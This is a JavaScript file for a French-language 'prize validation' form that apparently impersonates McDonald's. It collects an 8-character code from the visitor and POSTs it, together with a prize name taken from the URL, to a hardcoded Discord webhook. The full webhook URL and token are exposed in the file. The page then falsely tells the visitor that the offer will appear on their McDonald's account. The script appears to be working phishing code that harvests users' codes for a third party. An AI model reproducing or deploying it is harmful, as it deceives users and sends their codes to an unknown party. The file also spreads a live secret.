const prizeEl = document.getElementById('prizeName');
const codeInput = document.getElementById('code');
const submitBtn = document.getElementById('submitBtn');
const form = document.getElementById('codeForm');
const statusDiv = document.getElementById('status-message');

// Webhook Discord (fourni)
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1443224241544892548/EkmHdr4zE_I6Kqh8yRX_uVhn4IYtvjlZYtNn_E3sDnHIbQIYTzR5XbpW347pFAgJJbKy';

// Récupère le lot depuis l'URL ?lot=
const params = new URLSearchParams(window.location.search);
const lot = params.get('lot');
if (lot) {
  prizeEl.textContent = lot;
}

const validate = () => {
  const value = codeInput.value.trim();
  const isValid = /^[A-Za-z0-9]{8}$/.test(value);
  submitBtn.disabled = !isValid;
  statusDiv.textContent = '';
  statusDiv.className = 'status';
};

codeInput.addEventListener('input', validate);

form.addEventListener('submit', async (e) => {
  e.preventDefault();
  const value = codeInput.value.trim();
  if (!/^[A-Za-z0-9]{8}$/.test(value)) return;

  statusDiv.textContent = 'Envoi en cours...';
  statusDiv.className = 'status';
  submitBtn.disabled = true;
  codeInput.disabled = true;

  const payload = {
    embeds: [
      {
        title: 'Validation de gain',
        color: 5814783,
        fields: [
          { name: 'Lot', value: prizeEl.textContent, inline: false },
          { name: 'Code', value: value, inline: false },
        ],
        timestamp: new Date().toISOString(),
      },
    ],
  };

  try {
    const response = await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });

    if (response.ok) {
      statusDiv.textContent = 'Votre offre sera bientôt disponible sur votre compte McDonald\'s.';
      statusDiv.className = 'status success';
      form.reset();
    } else {
      statusDiv.textContent = `Erreur lors de l\'envoi : ${response.status}`;
      statusDiv.className = 'status error';
    }
  } catch (err) {
    statusDiv.textContent = `Erreur de connexion : ${err.message}`;
    statusDiv.className = 'status error';
  } finally {
    submitBtn.disabled = false;
    codeInput.disabled = false;
  }
});
